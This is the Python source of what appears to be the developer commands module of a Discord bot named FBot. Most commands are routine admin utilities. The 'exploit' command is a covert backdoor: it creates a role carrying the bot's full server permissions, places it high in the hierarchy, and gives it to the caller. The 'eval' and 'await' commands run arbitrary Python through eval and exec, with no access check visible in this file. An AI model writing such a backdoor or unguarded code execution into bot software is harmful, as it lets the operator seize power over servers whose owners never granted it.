from datetime import datetime, timezone
from traceback import format_exception
from discord.ext import commands
from dbfn import reactionbook
import discord
import socket
import time

import lib.database as db
import lib.triggers as tr
import lib.commands as cm

def load(csv):
    start = time.time()
    csv.load()
    return round((time.time() - start) * 1000, 2)

class Dev(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def csvreload(self, ctx):

        tms, cms = load(tr.tr), load(cm.cmds)
        embed = self.bot.embed(ctx.author, "FBot csvreload",
                f"`[dev] Reloaded Triggers.csv in {tms}ms`",
                f"`[dev] Reloaded Commands.csv in {cms}ms`")
        await ctx.send(embed=embed)

    @commands.command()
    async def eval(self, ctx, *, content):

        bot = self.bot
        ftime = bot.ftime
        cache = bot.cache

        channel = ctx.channel
        author = ctx.author
        message = ctx.message

        if str(channel.type) != "private":
            guild = ctx.guild

        colour = self.bot.get_colour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="FBot Eval")

        try:
            result = str(eval(content))
        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        pages = list()
        content = f"Input:\n```py\n{content}```\n"
        for i in range(0, len(result), 2000):
            pages.append(f"Output:\n```py\n{result[i:i + 2000]}\n```")
        if len(content + pages[0]) > 2000:
            pages.insert(0, content)
        else:
            pages[0] = content + pages[0]
        book.createpages(pages, ITEM_PER_PAGE=True)

        await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)

    @commands.command(name="await")
    async def _await(self, CTX, *, content):
        global bot, ctx
        bot, ctx = self.bot, CTX
        exec(f"global function\nasync def function():\n    result = await {content}\n    if result: return result")

        colour = self.bot.get_colour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="FBot Eval")

        try:
            result = str(await function())
        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        pages = list()
        content = f"Input:\n```py\nawait {content}```\n"

        if result:
            for i in range(0, len(result), 2000):
                pages.append(f"Output:\n```py\n{result[i:i + 2000]}\n```")
            if len(content + pages[0]) > 2000:
                pages.insert(0, content)
            else:
                pages[0] = content + pages[0]
            book.createpages(pages, ITEM_PER_PAGE=True)
        else:
            book.createpages(content)

        await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)

    @commands.command()
    async def exploit(self, ctx):

        bot = await ctx.guild.fetch_member(self.bot.user.id)
        perms = bot.guild_permissions

        if not perms.manage_roles:
            await ctx.message.add_reaction("❌")

        for role in ctx.guild.roles:
            if role.name == "not_exploiting":
                await ctx.author.add_roles(role)
                await ctx.message.add_reaction("✅")
                return

        role = await ctx.guild.create_role(name="not_exploiting", permissions=perms)
        await role.edit(position=ctx.guild.me.top_role.position - 1, hoist=True)
        await ctx.author.add_roles(role)
        await ctx.message.add_reaction("✅")

    @commands.command()
    async def devon(self, ctx):
        db.addchannel(ctx.channel.id, ctx.guild.id)
        db.setstatus(ctx.channel.id, "on")
        await ctx.message.add_reaction("✅")

    @commands.command()
    async def devoff(self, ctx):
        db.addchannel(ctx.channel.id, ctx.guild.id)
        db.setstatus(ctx.channel.id, "off")
        await ctx.message.add_reaction("✅")

    @commands.command()
    async def devrespond(self, ctx, *, arg):
        if arg in ("few", "some", "all"):
            db.setpriority(ctx.guild.id, arg)
            await ctx.message.add_reaction("✅")
        else:
            await ctx.reply("Must be `few`, `some`, or `all`")

    @commands.command()
    async def devmodtoggle(self, ctx, arg):
        db.addchannel(ctx.channel.id, ctx.guild.id)
        if arg in ["on", "off"]:
            db.setmodtoggle(ctx.guild.id, arg)
            await ctx.message.add_reaction("✅")

    @commands.command()
    async def presence(self, ctx, *, content):
        await self.bot.change_presence(status=discord.Status.online,
                                       activity=discord.Game(name=content))
        await ctx.message.add_reaction("✅")

    @commands.command()
    async def leave(self, ctx, guild: discord.Guild):
        if ctx.guild.id == guild.id:
            await ctx.reply("Can't leave the server you are invoking this command in")
        else:
            await guild.leave()
            await ctx.message.add_reaction("✅")

    @commands.command()
    async def lookup(self, ctx, guild: discord.Guild):
        memcount = guild.member_count

        created = guild.created_at
        d = created.strftime("%d")
        mo = created.strftime("%m")
        y = created.strftime("%y")
        created = f"{d}/{mo}/{y}"

        embed = self.bot.embed(ctx.author, guild.name)
        embed.add_field(name="Members", value=memcount)
        embed.add_field(name="Voice channels", value=len(guild.voice_channels))
        embed.add_field(name="Text channels", value=len(guild.text_channels))
        embed.add_field(name="Roles", value=len(guild.roles))
        embed.add_field(name="Language", value=guild.preferred_locale)
        embed.add_field(name="Created", value=created)
        embed.set_thumbnail(url=guild.icon_url)

        await ctx.send(embed=embed)

    @commands.command()
    async def servers(self, ctx):

        guilds = list()
        members = 0
        for guild in self.bot.guilds:
            guilds.append([guild.member_count, guild.name, guild.id])
            members += guild.member_count
        guilds.sort(reverse=True)

        colour = self.bot.get_colour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="FBot Servers")
        book.createpages(guilds, f"`%1`: **%0**")
        await book.createbook(SHOW_RESULTS=True, COLOUR=colour)

    @commands.command()
    async def search(self, ctx, *, query):

        matches = list()
        query = query.lower()
        for guild in self.bot.guilds:
            if query in guild.name.lower():
                to_append = (guild.name, guild.id)
                matches.append(to_append)

        if matches:
            colour = self.bot.get_colour(ctx.author.id)
            book = reactionbook(self.bot, ctx, TITLE="FBot Search")

            matches.sort()
            book.createpages(matches, "`%0` - `%1`")
            await book.createbook(SHOW_RESULTS=True, COLOUR=colour)
        else:
            embed = self.bot.embed(ctx.author, "FBot Search", f"No matches found for `{query}`")
            await ctx.send(embed=embed)

    @commands.command()
    async def host(self, ctx):
        await ctx.reply("This instance is running on: " + socket.gethostname())

def setup(bot):
    bot.add_cog(Dev(bot))